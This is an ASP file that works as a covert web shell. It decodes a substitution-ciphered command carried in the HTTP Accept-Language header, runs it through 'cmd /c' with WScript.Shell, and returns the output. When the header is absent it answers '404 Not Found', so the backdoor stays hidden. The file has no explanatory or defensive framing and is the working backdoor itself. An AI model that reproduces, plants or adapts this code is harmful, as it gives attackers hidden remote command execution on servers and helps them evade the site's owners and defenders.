<% 
Function Decode(inputString)
    Dim en, de, outputString, i, char
    en = "AB_CDEFG.HIJKLM!$%&*()?NOPQR-STUVWXYZabcdefghijklmnopqrstu=vwxyz0123456789/"
    de = "Qk3\afcPbYJTGywSv=0Egdx62X-NRVz!~$%_*()?Uq7os1ijFMuLOetCl98K5hBDn4.prWAHmIZ"
    outputString = ""
    For i = 1 To Len(inputString)
        char = Mid(inputString, i, 1)
        Dim index
        index = InStr(de, char)
        
        If index > 0 Then
            outputString = outputString & Mid(en, index, 1)
        Else
            outputString = outputString & char
        End If
    Next
    
    Decode = outputString
End Function
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
Dim acceptLanguage
acceptLanguage = Request.ServerVariables("HTTP_ACCEPT_LANGUAGE")
If acceptLanguage <> "" Then

Dim result
result = Decode(acceptLanguage)
thisDir = getCommandOutput("cmd /c" & result)
Response.Write(thisDir)
Else 
    Response.Status = "404 Not Found"
    Response.End 
End If 
%>
